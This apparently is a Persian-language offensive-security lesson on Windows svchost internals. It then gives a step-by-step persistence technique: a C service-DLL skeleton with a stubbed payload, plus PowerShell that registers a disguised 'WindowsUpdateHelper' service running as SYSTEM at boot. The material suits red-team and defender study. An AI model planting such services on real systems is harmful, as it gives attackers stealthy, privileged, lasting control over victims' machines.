
[[Session 3 Persistence]]


درسته. بریم سراغش.

## svchost.exe چیست؟

**Service Host** - یک Container Process برای اجرای Windows Services که به صورت DLL نوشته شده‌اند.

### چرا DLL؟

معماری Windows Services:
─────────────────────────────────────────────
EXE Service    → پروسس مستقل خودش رو داره
DLL Service    → نمی‌تونه مستقیم اجرا بشه
               → نیاز به یه Host Process داره
               → اون Host Process = svchost.exe


### ساختار یه DLL Service

```c
// هر DLL سرویس باید این Export رو داشته باشه:
ServiceMain(DWORD argc, LPTSTR *argv)

// و این رو برای Control:
Handler(DWORD fdwControl)
```

### چطور svchost یه DLL رو لود می‌کنه؟

Registry Path:
HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>\

    Parameters\
        ServiceDll = C:\Windows\System32\example.dll
        ServiceDllUnloadOnStop = 1

    Start    = 2 (Automatic) / 3 (Manual)
    Type     = 0x20 (Win32ShareProcess) ← اجرا داخل svchost


### چرا چندین svchost داریم؟

قدیم (قبل از Windows 10 1703):
    یه svchost → چندین سرویس (برای صرفه‌جویی RAM)
    
جدید (بعد از 1703 با RAM بالا):
    یه svchost → فقط یه سرویس
    (برای Isolation بهتر)


Task Manager نمونه:
svchost.exe → wuauserv (Windows Update)
svchost.exe → Dnscache
svchost.exe → Spooler
svchost.exe → EventLog


### گروه‌بندی سرویس‌ها (-k flag)

HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost\
    netsvcs    = [wuauserv, Schedule, BITS, ...]
    LocalServiceNetworkRestricted = [...]
    
svchost.exe -k netsvcs       ← یه instance
svchost.exe -k LocalService  ← instance دیگه


---



## Persistence via Malicious Service DLL in svchost

### مکانیزم کلی

مهاجم یه DLL مخرب می‌سازه
    ↓
یه Service جدید ثبت می‌کنه (Type=0x20)
    ↓
Service به svchost می‌گه این DLL رو لود کن
    ↓
هر بار Windows بوت میشه → DLL اجرا میشه


---

### مرحله ۱ - ساخت DLL مخرب

```c
// malicious_svc.cpp
#include <windows.h>

VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
VOID WINAPI ServiceCtrlHandler(DWORD);

SERVICE_STATUS        g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_StatusHandle  = NULL;

// ── این تابع موقع لود DLL اجرا میشه ──
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        // Payload اینجا
        // مثلاً Reverse Shell یا اضافه کردن یوزر
    }
    return TRUE;
}

VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
    g_StatusHandle = RegisterServiceCtrlHandler(
        L"MaliciousSvc", ServiceCtrlHandler);
    
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    
    // Loop تا سرویس Stop نشه
    while (TRUE) { Sleep(5000); }
}

VOID WINAPI ServiceCtrlHandler(DWORD control) {
    if (control == SERVICE_CONTROL_STOP) {
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    }
}
```

---

### مرحله ۲ - ثبت Service در Registry

```powershell
# نیاز به Admin داره

$svcName = "WindowsUpdateHelper"   # اسم که Blend بشه
$dllPath = "C:\Windows\System32\wuhelper.dll"  # جای DLL مخرب

# ساخت کلید سرویس
New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svcName"

# تنظیمات اصلی
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svcName" `
    -Name "Type"        -Value 0x20      # Win32ShareProcess ← کلید اصلی
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svcName" `
    -Name "Start"       -Value 2         # Automatic
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svcName" `
    -Name "ErrorControl" -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svcName" `
    -Name "ImagePath"   -Value "C:\Windows\System32\svchost.exe -k netsvcs"
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svcName" `
    -Name "ObjectName"  -Value "LocalSystem"  # اجرا با SYSTEM

# مسیر DLL مخرب
New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svcName\Parameters"
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svcName\Parameters" `
    -Name "ServiceDll"  -Value $dllPath
```

---

### مرحله ۳ - اضافه کردن به گروه svchost

```powershell
# سرویس رو به گروه netsvcs اضافه کن
# تا زیر svchost.exe -k netsvcs اجرا بشه

$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
$current = (Get-ItemProperty -Path $regPath -Name "netsvcs").netsvcs
$current += $svcName

Set-ItemProperty -Path $regPath -Name "netsvcs" -Value $current
```

---

### مرحله ۴ - Start کردن سرویس

```powershell
Start-Service -Name $svcName
# یا
sc.exe start WindowsUpdateHelper
```

---

### نتیجه در Task Manager

svchost.exe -k netsvcs
    └── WindowsUpdateHelper   ← مخرب ولی شبیه سرویس معمولی
    └── wuauserv
    └── Schedule


---

### چرا این تکنیک مهمه؟

| ویژگی | توضیح |
|---|---|
| Persistence | هر بار بوت → اجرا |
| Stealth | لابلای سرویس‌های معمولی |
| Privilege | با SYSTEM اجرا میشه |
| LOLBin | از svchost.exe بومی استفاده می‌کنه |

---
